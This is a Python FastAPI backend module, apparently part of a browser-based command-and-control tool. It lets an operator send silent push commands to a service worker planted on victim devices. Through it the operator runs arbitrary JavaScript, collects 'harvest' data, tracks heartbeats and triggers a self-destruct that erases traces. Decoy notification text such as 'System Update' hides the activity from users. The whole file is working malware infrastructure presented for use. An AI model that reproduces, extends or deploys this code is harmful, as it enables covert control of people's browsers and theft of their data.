"""
SW C2 Router  —  /api/sw-c2/
Operator-facing endpoints for managing the Service Worker C2 channel.
All state is in-memory; restart clears it (by design — ephemeral C2 layer).
"""

from __future__ import annotations

import json
from collections import deque
from typing import Any, Deque

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from sqlalchemy import desc
from backend.auth import get_current_user
from backend.database import get_db
from backend.models import Device, Event

# Re-use the push helper from push_router rather than duplicating VAPID logic
from backend.api.dashboard.push_router import _send_push

# ---------------------------------------------------------------------------
# In-memory state
# ---------------------------------------------------------------------------

# { device_id (int) -> SW C2 status dict }
_sw_status: dict[int, dict[str, Any]] = {}

# Ring buffer of recent heartbeat events (capped at 100)
_heartbeats: Deque[dict[str, Any]] = deque(maxlen=100)

# Pending command queues: { device_id -> [cmd, ...] }
# These are delivered via push so the queue is transient — it reflects
# commands that were sent but whose delivery we cannot guarantee.
_command_queue: dict[int, list[dict[str, Any]]] = {}


async def _handle_sw_event(device_id: int, event_type: str, body: dict) -> None:
    """Called by the collection server when the SW posts a result back."""
    status = _ensure_status(device_id)
    ts_raw = body.get("ts")
    # Normalize: SW sends Date.now() (ms); store as Unix seconds for the frontend
    ts = int(ts_raw / 1000) if isinstance(ts_raw, (int, float)) and ts_raw > 1e10 else ts_raw

    # Any response from device = proof of life → always update heartbeat
    if ts:
        status["last_heartbeat"] = ts

    if event_type == "pong":
        _heartbeats.append({"device_id": device_id, "event": "pong", "ts": ts, "payload": body.get("payload", {})})
    elif event_type == "device_info":
        _heartbeats.append({"device_id": device_id, "event": "device_info", "ts": ts, "payload": body.get("payload", {})})
    elif event_type in ("heartbeat", "sync"):
        _heartbeats.append({"device_id": device_id, "event": event_type, "ts": ts})
    elif event_type == "js_result":
        status["last_js_result"] = {
            "ok":     body.get("ok"),
            "result": body.get("result"),
            "ts":     ts or body.get("ts"),
        }
    elif event_type == "harvest_result":
        harvest_type = body.get("harvest_type", "unknown")
        status.setdefault("harvests", {})[harvest_type] = {
            "data": body.get("data"),
            "ts":   ts or body.get("ts"),
        }


def _ensure_status(device_id: int) -> dict[str, Any]:
    if device_id not in _sw_status:
        _sw_status[device_id] = {
            "last_heartbeat":    None,
            "last_sync":         None,
            "commands_sent":     0,
            "self_destruct_sent": False,
            "last_js_result":    None,
            "harvests":          {},   # harvest_type -> {data, ts}
        }
    return _sw_status[device_id]


# ---------------------------------------------------------------------------
# Router
# ---------------------------------------------------------------------------

router = APIRouter(prefix="/sw-c2", tags=["sw-c2"])


# ── GET /sw-c2/status/{device_id} ──────────────────────────────────────────

@router.get("/status/{device_id}")
async def sw_status(
    device_id: int,
    db: AsyncSession = Depends(get_db),
    user=Depends(get_current_user),
):
    """Return SW C2 status for a device."""
    result = await db.execute(select(Device).where(Device.id == device_id))
    device = result.scalar_one_or_none()
    if device is None:
        raise HTTPException(status_code=404, detail="device_not_found")

    status = _ensure_status(device_id)

    # Restore last_heartbeat from DB if in-memory state was cleared (e.g. after restart)
    if status["last_heartbeat"] is None:
        ev_result = await db.execute(
            select(Event)
            .where(Event.device_id == device_id)
            .where(Event.type.in_(["sw_pong", "sw_device_info", "sw_heartbeat", "sw_sync"]))
            .order_by(desc(Event.id))
            .limit(1)
        )
        ev = ev_result.scalar_one_or_none()
        if ev and ev.data_json:
            import json as _json
            try:
                ev_data = _json.loads(ev.data_json)
                ts_raw = ev_data.get("ts")
                if ts_raw:
                    status["last_heartbeat"] = int(ts_raw / 1000) if ts_raw > 1e10 else int(ts_raw)
            except Exception:
                pass

    pending = len(_command_queue.get(device_id, []))
    return {
        "device_id":          device_id,
        "device_name":        device.name,
        "push_capable":       bool(device.push_subscription),
        "last_heartbeat":     status["last_heartbeat"],
        "last_sync":          status["last_sync"],
        "command_queue_len":  pending,
        "commands_sent":      status["commands_sent"],
        "self_destruct_sent": status["self_destruct_sent"],
        "last_js_result":     status.get("last_js_result"),
        "harvests":           status.get("harvests", {}),
    }


# ── POST /sw-c2/command/{device_id} ────────────────────────────────────────

class C2CommandBody(BaseModel):
    type: str
    payload: dict[str, Any] = {}
    notif_title: str = 'System Update'
    notif_body: str = 'Your information has been updated.'


@router.post("/command/{device_id}")
async def queue_command(
    device_id: int,
    body: C2CommandBody,
    db: AsyncSession = Depends(get_db),
    user=Depends(get_current_user),
):
    """
    Sends a C2 command to the device's Service Worker via a silent push.
    The SW intercepts push events with type='c2_command' and executes them
    without showing a user-visible notification.
    """
    result = await db.execute(select(Device).where(Device.id == device_id))
    device = result.scalar_one_or_none()
    if device is None:
        raise HTTPException(status_code=404, detail="device_not_found")

    if not device.push_subscription:
        raise HTTPException(status_code=400, detail="device_has_no_push_subscription")

    # Build the push payload the SW expects
    from backend.api.collection import _device_token
    from backend.config import settings as _settings
    server_url = _settings.server_base_url or ""
    push_data = json.dumps({
        "type":        "c2_command",
        "server":      server_url,
        "token":       _device_token(device_id),
        "notif_title": body.notif_title,
        "notif_body":  body.notif_body,
        "payload": {
            "type":    body.type,
            "payload": body.payload,
        },
    })

    # Send via pywebpush — reuse the low-level helper from push_router,
    # but we need raw data control so we call pywebpush directly (same
    # pattern as _send_push, just without wrapping in title/body).
    from backend.config import settings
    if not settings.vapid_private_key:
        raise HTTPException(status_code=503, detail="vapid_not_configured")

    try:
        sub = json.loads(device.push_subscription)
    except Exception:
        raise HTTPException(status_code=400, detail="bad_subscription_json")

    push_result: dict[str, Any] = {"ok": False}
    try:
        from pywebpush import webpush, WebPushException  # type: ignore
        webpush(
            subscription_info=sub,
            data=push_data,
            vapid_private_key=settings.vapid_private_key,
            vapid_claims={"sub": settings.vapid_contact},
        )
        push_result = {"ok": True}
    except Exception as exc:
        push_result = {"ok": False, "error": str(exc)[:200]}

    # Track in-memory state
    status = _ensure_status(device_id)
    status["commands_sent"] += 1

    # Keep the command in the queue (informational — not re-delivery)
    _command_queue.setdefault(device_id, []).append({
        "type":    body.type,
        "payload": body.payload,
        "push_ok": push_result["ok"],
    })

    return {
        "ok":     push_result["ok"],
        "queued": push_result["ok"],
        "error":  push_result.get("error"),
    }


# ── POST /sw-c2/self-destruct/{device_id} ──────────────────────────────────

@router.post("/self-destruct/{device_id}")
async def self_destruct(
    device_id: int,
    db: AsyncSession = Depends(get_db),
    user=Depends(get_current_user),
):
    """
    Send a self_destruct command to the device's SW.
    The SW will call self.registration.unregister() and clear all caches.
    """
    result = await db.execute(select(Device).where(Device.id == device_id))
    device = result.scalar_one_or_none()
    if device is None:
        raise HTTPException(status_code=404, detail="device_not_found")

    if not device.push_subscription:
        raise HTTPException(status_code=400, detail="device_has_no_push_subscription")

    from backend.config import settings
    if not settings.vapid_private_key:
        raise HTTPException(status_code=503, detail="vapid_not_configured")

    try:
        sub = json.loads(device.push_subscription)
    except Exception:
        raise HTTPException(status_code=400, detail="bad_subscription_json")

    push_data = json.dumps({
        "type":    "c2_command",
        "payload": {"type": "self_destruct", "payload": {}},
    })

    push_result: dict[str, Any] = {"ok": False}
    try:
        from pywebpush import webpush  # type: ignore
        webpush(
            subscription_info=sub,
            data=push_data,
            vapid_private_key=settings.vapid_private_key,
            vapid_claims={"sub": settings.vapid_contact},
        )
        push_result = {"ok": True}
    except Exception as exc:
        push_result = {"ok": False, "error": str(exc)[:200]}

    # Mark intent in status regardless of push delivery
    status = _ensure_status(device_id)
    status["self_destruct_sent"] = True
    status["commands_sent"] += 1

    return {
        "ok":                  push_result["ok"],
        "self_destruct_sent":  True,
        "error":               push_result.get("error"),
    }


# ── GET /sw-c2/heartbeats ───────────────────────────────────────────────────

@router.get("/heartbeats")
async def list_heartbeats(user=Depends(get_current_user)):
    """Return the last 100 heartbeat events from all devices (most recent last)."""
    return list(_heartbeats)


# ---------------------------------------------------------------------------
# Internal endpoint: collection server posts heartbeat/sync events here
# so the dashboard can track SW liveness.
# (Called by the collection-side sync handler, not by the operator directly.)
# ---------------------------------------------------------------------------

class SWEventBody(BaseModel):
    device_id: int
    event: str  # 'heartbeat' | 'sync'
    ts: int


@router.post("/_internal/event")
async def record_sw_event(body: SWEventBody, _user=Depends(get_current_user)):
    """
    Called by the collection server when a device SW posts a heartbeat or sync.
    Requires authentication — collection server uses operator API key.
    """
    status = _ensure_status(body.device_id)
    entry = {"device_id": body.device_id, "event": body.event, "ts": body.ts}

    if body.event == "heartbeat":
        status["last_heartbeat"] = body.ts
        _heartbeats.append(entry)
    elif body.event == "sync":
        status["last_sync"] = body.ts

    return {"ok": True}
